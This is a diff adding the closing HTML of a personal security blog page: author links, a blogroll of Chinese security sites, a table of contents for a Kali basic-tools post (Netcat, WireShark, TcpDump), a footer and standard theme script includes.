+                  <span class="links-of-author-item">
+                    <a href="https://weibo.com/u/5794121667" target="_blank" title="Weibo">
+                      
+                        <i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="/images/weixin.JPG" target="_blank" title="Wechat">
+                      
+                        <i class="fa fa-fw fa-weixin"></i>Wechat</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.t00ls.net/" title="T00ls" target="_blank">T00ls</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.freebuf.com/" title="FreeBuf" target="_blank">FreeBuf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.sec-wiki.com/" title="SecWiki" target="_blank">SecWiki</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.seebug.org/" title="Seebug" target="_blank">Seebug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.91ri.org/" title="91Ri" target="_blank">91Ri</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.pediy.com/" title="看雪" target="_blank">看雪</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.52pojie.cn/" title="吾爱破解" target="_blank">吾爱破解</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.anquanke.com/" title="安全客" target="_blank">安全客</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.ichunqiu.com/" title="i春秋" target="_blank">i春秋</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Kali实战-基本工具"><span class="nav-text">Kali实战-基本工具</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Netcat"><span class="nav-text">Netcat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WireShark"><span class="nav-text">WireShark</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TcpDump"><span class="nav-text">TcpDump</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文档记录工具"><span class="nav-text">文档记录工具</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ry1ynn</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script id="ribbon" type="text/javascript" size="300" alpha="0.5" zindex="0" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
